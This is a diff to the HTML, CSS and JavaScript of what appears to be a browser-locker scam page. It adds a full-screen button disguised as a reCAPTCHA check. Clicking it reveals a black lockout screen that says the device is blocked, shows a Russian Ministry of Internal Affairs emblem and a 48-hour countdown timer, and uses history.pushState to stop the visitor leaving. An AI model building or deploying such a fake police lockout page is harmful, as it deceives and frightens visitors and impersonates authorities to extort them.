@@ -11,18 +11,21 @@
             box-sizing: border-box;
         }
         body {
-            background: white;
+            font-family: Arial, sans-serif;
+            user-select: none;
+            overflow: hidden;
+        }
+        .start-btn {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100vw;
             height: 100vh;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-family: Arial, sans-serif;
-            text-align: center;
-            user-select: none;
-        }
-        .hidden {
-            display: none;
+            background: white;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            z-index: 10;
         }
         .block-screen {
             position: fixed;
@@ -33,7 +36,10 @@
             background: black;
             color: white;
             text-align: center;
-            padding: 20px;
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
             z-index: 9999;
         }
         .block-screen img {
@@ -47,12 +53,15 @@
         .warning {
             font-size: 18px;
             margin-top: 10px;
+            max-width: 80%;
         }
     </style>
 </head>
 <body>
 
-<div class="block-screen hidden" id="blockScreen">
+<button class="start-btn" id="startBtn">Click for check by recaptcha</button>
+
+<div class="block-screen" id="blockScreen">
     <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/7/7f/Emblem_of_the_Ministry_of_Internal_Affairs.svg/1280px-Emblem_of_the_Ministry_of_Internal_Affairs.svg.png" alt="Герб">
     <h1>ВАШЕ УСТРОЙСТВО ЗАБЛОКИРОВАНО</h1>
     <div class="timer" id="timer">48:00:00</div>
@@ -64,10 +73,10 @@
 </div>
 
 <script>
-    document.body.addEventListener("click", function () {
-        document.body.innerHTML = ""; // Очистка экрана
+    document.getElementById("startBtn").addEventListener("click", function () {
+        this.style.display = "none"; // Убираем кнопку после нажатия
         let blockScreen = document.getElementById("blockScreen");
-        blockScreen.classList.remove("hidden");
+        blockScreen.style.display = "flex"; // Включаем блокировку
 
         // Принудительная блокировка страницы
         history.pushState(null, null, location.href);
